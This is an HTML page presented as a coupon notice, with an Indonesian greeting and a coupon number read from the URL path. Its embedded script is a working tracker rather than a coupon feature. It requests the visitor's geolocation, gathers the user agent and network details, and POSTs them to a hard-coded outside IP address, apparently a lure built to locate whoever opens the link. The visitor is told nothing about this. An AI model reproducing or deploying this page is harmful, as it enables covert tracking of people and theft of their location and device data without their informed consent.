<!DOCTYPE html>
<html>
<head>
  <title>Coupon</title>
</head>
<body>
  <h1 id="welcome-message">Welcome! Selamat Kupon Anda Sebagai Berikut: #<span id="coupon-number"></span></h1>
  <script>
    // Function to get the number from the URL path
    function getNumberFromPath() {
      const url = window.location.href;
      const urlObject = new URL(url);
      const pathname = urlObject.pathname;
      const match = pathname.match(/\/data\/(\d+)/);
      return match ? match[1] : null;
    }

    // Function to get the location
    function getLocation(callback) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => callback({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          }),
          error => {
            console.error('Error getting location:', error);
            callback(null); // Pass null to the callback if there's an error
          }
        );
      } else {
        console.error('Geolocation is not supported by this browser.');
        callback(null); // Pass null to the callback if geolocation is not supported
      }
    }

    // Function to get network information
    function getNetworkInformation() {
      let networkInfo = {};
      if (navigator.connection) {
        networkInfo = {
          downlink: navigator.connection.downlink,
          effectiveType: navigator.connection.effectiveType,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData
        };
      } else {
        console.error('Network Information API is not supported by this browser.');
      }
      return networkInfo;
    }

    // Get User Agent
    const userAgent = navigator.userAgent;

    // Get the extracted number from the URL
    const extractedNumber = getNumberFromPath();

    // Update the H1 element with the extracted number
    if (extractedNumber) {
      document.getElementById('coupon-number').textContent = extractedNumber;

      // Get location and update the page
      getLocation(location => {
        const locationInfoElement = document.getElementById('location-info');
        // if (location) {
        //   locationInfoElement.textContent = `Your location: Latitude ${location.latitude}, Longitude ${location.longitude}`;
        // } else {
        //   locationInfoElement.textContent = 'Unable to retrieve location. Please enable location access or provide location manually.';
        // }

        // Prepare data to be sent
        const data = {
          number: extractedNumber,
          userAgent,
          location,
          networkInfo: getNetworkInformation()
        };

        // Send data to the server
        fetch('http://152.42.184.255:5001/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        })
        .then(response => response.text())
        .then(data => console.log('Data logged successfully:', data))
        .catch(error => console.error('Error logging data:', error));
      });
    } else {
      console.error('No number found in the URL path.');
    }
  </script>
</body>
</html>
